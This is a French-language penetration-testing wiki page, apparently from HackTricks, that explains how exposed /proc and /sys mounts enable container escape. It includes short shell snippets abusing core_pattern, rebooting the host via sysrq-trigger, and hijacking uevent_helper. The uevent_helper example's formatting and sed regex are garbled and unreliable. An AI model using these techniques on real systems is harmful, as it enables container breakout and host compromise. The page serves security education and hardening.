# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

L'exposition de `/proc` et `/sys` sans une isolation appropriée des espaces de noms introduit des risques de sécurité significatifs, y compris l'augmentation de la surface d'attaque et la divulgation d'informations. Ces répertoires contiennent des fichiers sensibles qui, s'ils sont mal configurés ou accessibles par un utilisateur non autorisé, peuvent conduire à une évasion de conteneur, à une modification de l'hôte ou fournir des informations aidant à d'autres attaques. Par exemple, le montage incorrect de `-v /proc:/host/proc` peut contourner la protection AppArmor en raison de sa nature basée sur le chemin, laissant `/host/proc` non protégé.

**Vous pouvez trouver plus de détails sur chaque vulnérabilité potentielle dans** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnérabilités procfs

### `/proc/sys`

Ce répertoire permet d'accéder à la modification des variables du noyau, généralement via `sysctl(2)`, et contient plusieurs sous-répertoires préoccupants :

#### **`/proc/sys/kernel/core_pattern`**

- Décrit dans [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Permet de définir un programme à exécuter lors de la génération d'un fichier core avec les 128 premiers octets comme arguments. Cela peut conduire à une exécution de code si le fichier commence par un pipe `|`.
- **Exemple de test et d'exploitation** :

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Tester l'accès en écriture
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Définir un gestionnaire personnalisé
sleep 5 && ./crash & # Déclencher le gestionnaire
```

#### **`/proc/sys/kernel/modprobe`**

- Détails dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Contient le chemin vers le chargeur de modules du noyau, invoqué pour charger des modules du noyau.
- **Exemple de vérification d'accès** :

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Vérifier l'accès à modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Référencé dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Un drapeau global qui contrôle si le noyau panique ou invoque le tueur OOM lorsqu'une condition OOM se produit.

#### **`/proc/sys/fs`**

- Selon [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contient des options et des informations sur le système de fichiers.
- L'accès en écriture peut permettre divers attaques par déni de service contre l'hôte.

#### **`/proc/sys/fs/binfmt_misc`**

- Permet d'enregistrer des interprètes pour des formats binaires non natifs en fonction de leur numéro magique.
- Peut conduire à une élévation de privilèges ou à un accès shell root si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture.
- Exploit pertinent et explication :
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Tutoriel approfondi : [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Autres dans `/proc`

#### **`/proc/config.gz`**

- Peut révéler la configuration du noyau si `CONFIG_IKCONFIG_PROC` est activé.
- Utile pour les attaquants pour identifier les vulnérabilités dans le noyau en cours d'exécution.

#### **`/proc/sysrq-trigger`**

- Permet d'invoquer des commandes Sysrq, pouvant provoquer des redémarrages immédiats du système ou d'autres actions critiques.
- **Exemple de redémarrage de l'hôte** :

```bash
echo b > /proc/sysrq-trigger # Redémarre l'hôte
```

#### **`/proc/kmsg`**

- Expose les messages du tampon de noyau.
- Peut aider dans les exploits du noyau, les fuites d'adresses et fournir des informations sensibles sur le système.

#### **`/proc/kallsyms`**

- Liste les symboles exportés par le noyau et leurs adresses.
- Essentiel pour le développement d'exploits du noyau, en particulier pour surmonter KASLR.
- Les informations d'adresse sont restreintes avec `kptr_restrict` réglé sur `1` ou `2`.
- Détails dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interface avec le périphérique de mémoire du noyau `/dev/mem`.
- Historiquement vulnérable aux attaques d'élévation de privilèges.
- Plus d'informations sur [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Représente la mémoire physique du système au format ELF core.
- La lecture peut divulguer le contenu de la mémoire du système hôte et d'autres conteneurs.
- La grande taille du fichier peut entraîner des problèmes de lecture ou des plantages de logiciels.
- Utilisation détaillée dans [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Interface alternative pour `/dev/kmem`, représentant la mémoire virtuelle du noyau.
- Permet la lecture et l'écriture, donc la modification directe de la mémoire du noyau.

#### **`/proc/mem`**

- Interface alternative pour `/dev/mem`, représentant la mémoire physique.
- Permet la lecture et l'écriture, la modification de toute la mémoire nécessite de résoudre les adresses virtuelles en adresses physiques.

#### **`/proc/sched_debug`**

- Renvoie des informations sur la planification des processus, contournant les protections de l'espace de noms PID.
- Expose les noms de processus, les ID et les identifiants de cgroup.

#### **`/proc/[pid]/mountinfo`**

- Fournit des informations sur les points de montage dans l'espace de noms de montage du processus.
- Expose l'emplacement du `rootfs` ou de l'image du conteneur.

### Vulnérabilités `/sys`

#### **`/sys/kernel/uevent_helper`**

- Utilisé pour gérer les `uevents` des périphériques du noyau.
- Écrire dans `/sys/kernel/uevent_helper` peut exécuter des scripts arbitraires lors des déclenchements d'`uevent`.
- **Exemple d'exploitation** : %%%bash

#### Crée une charge utile

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Trouve le chemin de l'hôte à partir du montage OverlayFS pour le conteneur

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Définit uevent_helper sur l'assistant malveillant

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Déclenche un uevent

echo change > /sys/class/mem/null/uevent

#### Lit la sortie

cat /output %%%

#### **`/sys/class/thermal`**

- Contrôle les paramètres de température, pouvant causer des attaques DoS ou des dommages physiques.

#### **`/sys/kernel/vmcoreinfo`**

- Fuit des adresses du noyau, compromettant potentiellement KASLR.

#### **`/sys/kernel/security`**

- Contient l'interface `securityfs`, permettant la configuration des modules de sécurité Linux comme AppArmor.
- L'accès pourrait permettre à un conteneur de désactiver son système MAC.

#### **`/sys/firmware/efi/vars` et `/sys/firmware/efi/efivars`**

- Expose des interfaces pour interagir avec les variables EFI dans NVRAM.
- Une mauvaise configuration ou exploitation peut conduire à des ordinateurs portables brisés ou à des machines hôtes non amorçables.

#### **`/sys/kernel/debug`**

- `debugfs` offre une interface de débogage "sans règles" au noyau.
- Historique de problèmes de sécurité en raison de sa nature non restreinte.

### Références

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
